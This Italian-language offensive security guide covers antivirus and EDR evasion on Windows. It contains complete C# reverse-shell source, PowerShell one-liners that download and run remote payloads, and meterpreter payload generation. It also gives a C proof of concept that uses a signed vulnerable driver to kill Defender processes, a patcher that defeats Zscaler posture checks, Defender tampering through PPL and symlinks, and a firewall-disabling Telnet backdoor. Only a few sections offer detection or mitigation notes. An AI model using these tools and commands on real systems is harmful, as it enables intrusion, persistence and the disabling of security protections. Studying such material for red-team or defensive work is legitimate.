## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i propri strumenti post-exploitation senza essere intercettati dall'AV.

Dato che il payload viene caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Coinvolge il **lancio di un nuovo processo sacrificabile**, iniettare il tuo codice post-exploitation malevolo in quel nuovo processo, eseguire il codice e, una volta finito, uccidere il processo. Questo ha vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo Beacon implant. Questo significa che se qualcosa nella nostra azione post-exploitation va storto o viene intercettata, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che si ha una **probabilità maggiore** di essere rilevati da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice post-exploitation malevolo **nel proprio processo**. In questo modo si evita di creare un nuovo processo che venga scansionato dall'AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il beacon** poiché potrebbe causare un crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di C# Assembly, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il video di S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla Attacker Controlled SMB share**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla share SMB puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. Testare con shell reversi non offuscati in questi linguaggi si è dimostrato efficace.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non muoia ma non abbia i permessi per verificare attività malevole.

Per prevenire ciò Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è semplice distribuire Chrome Remote Desktop su un PC vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla vittima (richiede privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il PIN senza usare la GUI).


## Advanced Evasion

L'evasione è un argomento molto complicato, a volte bisogna considerare molte diverse sorgenti di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti troverai ad operare avrà i propri punti di forza e di debolezza.

Ti consiglio caldamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per avere una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questa è anche un'altra ottima presentazione di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a quando **non scopre quale parte Defender** trova come malevola e te la segnalerà.\
Un altro tool che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows 10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia telnet port** (stealth) e disabilita firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i bin downloads, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire all'interno** del suo **host** il binario `vncviewer.exe -listen 5900` in modo da essere **preparato** a intercettare una reverse **VNC connection**. Poi, nella **victim**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth devi evitare alcune cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o farà aprire [the config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilazione della nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uccidere AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *signed*** e lo sfrutta per eseguire operazioni privilegiate nel kernel che anche i servizi AV in Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dell’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver porta una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **servizio kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo spazio utente.
3. **IOCTLs esposti dal driver**
| IOCTL code | Funzionalità                              |
|-----------:|-------------------------------------------|
| `0x99000050` | Termina un processo arbitrario per PID (usato per terminare i servizi di Defender/EDR) |
| `0x990000D0` | Elimina un file arbitrario su disco |
| `0x990001D0` | Scarica il driver e rimuove il servizio |

Proof-of-concept minimo in C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD salta completamente le protezioni in user-mode; il codice che esegue nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel indipendentemente da PPL/PP, ELAM o altre contromisure.

Rilevamento / Mitigazione
•  Abilitare la block list dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi *servizi* kernel e generare allarmi quando un driver viene caricato da una directory scrivibile da chiunque o non presente nella lista di consentiti.  
•  Sorvegliare handle in user-mode verso oggetti device custom seguiti da chiamate sospette a `DeviceIoControl`.

### Bypassare i controlli di postura di Zscaler Client Connector tramite patching binario su disco

Zscaler’s Client Connector applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (viene inviato al server un booleano).  
2. Gli endpoint RPC interni validano solo che l’eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari firmati su disco entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale patchata | Risultato |
|--------|---------------------------|----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Ritorna sempre `1` in modo che ogni controllo sia conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Aggirata |

Estratto minimo del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di posture mostrano **verde/conforme**.
* Binarie non firmate o modificate possono aprire gli endpoint RPC su named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo caso di studio dimostra come decisioni di trust puramente client-side e semplici controlli di firma possano essere sconfitti con poche patch di byte.

## Sfruttare Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) impone una gerarchia firma/livello in modo che solo processi protetti di pari o superiore livello possano interferire tra loro. In ambito offensivo, se puoi avviare legittimamente un binario abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità benigne (es., logging) in una write primitive vincolata da PPL verso directory protette usate da AV/EDR.

What makes a process run as PPL
- L'EXE di destinazione (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile che corrisponda al signer del binario (es., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per signer Windows). Livelli errati causeranno il fallimento alla creazione.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di lancio
- Helper open-source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Modalità d'uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Elenca i nomi corti: `dir /x` in ciascuna directory padre.
- Ottieni il percorso corto in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia il LOLBIN compatibile PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (es., CreateProcessAsPPL).
2) Passa l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (es., Defender Platform). Usa nomi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (es., MsMpEng.exe), pianifica la scrittura al boot prima che l'AV si avvii installando un servizio ad avvio automatico che venga eseguito prima in modo affidabile. Verifica l'ordine di avvio con Process Monitor (boot logging).
4) Al reboot la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare i contenuti che ClipUp scrive oltre alla posizione; la primitiva è adatta alla corruzione più che all'iniezione precisa di contenuti.
- Richiede admin locale/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Rilevamenti
- Creazione di processi di `ClipUp.exe` con argomenti insoliti, specialmente parentati da launcher non standard, intorno all'avvio.
- Nuovi servizi configurati per l'avvio automatico di binari sospetti che si avviano costantemente prima di Defender/AV. Indagare sulla creazione/modifica del servizio prima dei fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari/Directory Platform di Defender; creazioni/modifiche di file inattese da processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo di livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali processi parent; bloccare l'invocazione di ClipUp al di fuori di contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad avvio automatico e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che Defender tamper protection e le protezioni early-launch siano abilitate; indagare errori di avvio che indicano corruzione di binari.
- Considerare la disabilitazione della generazione di nomi 8.3 sui volumi che ospitano tool di sicurezza se compatibile con l'ambiente (testare approfonditamente).

Riferimenti per PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validazione dell'ordine): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manomissione di Microsoft Defender tramite Symlink Hijack della cartella Platform Version

Windows Defender sceglie la platform da cui viene eseguito enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (es., `4.18.25070.5-0`), quindi avvia i processi del servizio Defender da lì (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si fida delle voci di directory incluse reparse point di directory (symlinks). Un amministratore può sfruttare questo per reindirizzare Defender verso un percorso scrivibile dall'attaccante e ottenere DLL sideloading o interruzione del servizio.

Precondizioni
- Local Administrator (necessario per creare directory/symlink sotto la cartella Platform)
- Possibilità di riavviare o forzare la rielezione della platform di Defender (riavvio del servizio all'avvio)
- Richiede solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della platform si fida delle voci di directory e sceglie la versione lessicograficamente più alta senza verificare che la destinazione risolva in un percorso protetto/attendibile.

Passo-passo (esempio)
1) Preparare una copia scrivibile della cartella platform corrente, es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (reboot consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che rifletta quella posizione.

Post-exploitation options
- DLL sideloading/code execution: Posizionare/sostituire DLL che Defender carica dalla sua directory dell'applicazione per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink in modo che al successivo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation di privilegi di per sé; richiede diritti amministrativi.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare l'evitamento a runtime fuori dall'implant C2 e dentro il modulo target stesso hookando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position‑independent controllato dall'attaccante (PIC). Questo generalizza l'evasione oltre la piccola superficie di API esposta da molti kit (es., CreateProcessA), ed estende le stesse protezioni a BOFs e DLL post‑exploitation.

Approccio ad alto livello
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). Il PIC deve essere autocontenenuto e position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Le evasione tipiche includono:
  - Memory mask/unmask intorno alla chiamata (es., encrypt beacon regions, RWX→RX, change page names/permissions) e poi ripristino post‑call.
  - Call‑stack spoofing: costruire uno stack benigno e transitare nell'API target in modo che l'analisi della call‑stack risolva nei frame attesi.
- Per compatibilità, esportare un'interfaccia in modo che uno script Aggressor (o equivalente) possa registrare quali API hookare per Beacon, BOFs e DLL post‑ex.

Why IAT hooking here
- Funziona per qualsiasi codice che usa l'import hookato, senza modificare il codice degli strumenti o fare affidamento su Beacon per proxyare API specifiche.
- Copre le DLL post‑ex: hooking LoadLibrary* permette di intercettare i caricamenti di moduli (es., System.Management.Automation.dll, clr.dll) e applicare lo stesso masking/stack evasion alle loro chiamate API.
- Ripristina l'uso affidabile di comandi post‑ex che spawnano processi contro rilevamenti basati sulla call‑stack avvolgendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders like TitanLdr/AceLdr dimostrano hooking durante DllMain del modulo caricato.
- Mantieni i wrappers piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale che hai catturato prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs costruiscono una catena di chiamate falsa (return addresses in moduli benigni) e poi entrano nella real API.
- Questo sconfigge le rilevazioni che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Prepend il reflective loader alle DLL post‑ex in modo che PIC e hook si inizializzino automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target in modo che Beacon e BOFs beneficino in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni Detection/DFIR
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: return addresses che non appartengono a immagini caricate; transizioni brusche verso PIC non‑image; ascendenza RtlUserThreadStart incoerente.
- Loader telemetry: scritture in‑process sulla IAT, attività precoce in DllMain che modifica import thunks, regioni RX inaspettate create al load.
- Image‑load evasion: se si effettua hooking di LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Blocchi costitutivi ed esempi correlati
- Reflective loaders che eseguono IAT patching durante il load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft per Fileless Evasion e Credential Theft

SantaStealer (aka BluelineStealer) illustra come gli info‑stealers moderni fondono AV bypass, anti-analysis e credential access in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un config flag (`anti_cis`) enumera le installed keyboard layouts via `GetKeyboardLayoutList`. Se viene trovata una Cyrillic layout, il sample deposita un marcatore vuoto `CIS` e termina prima di eseguire gli stealers, assicurando che non detoni mai su località escluse lasciando però un artefatto per hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
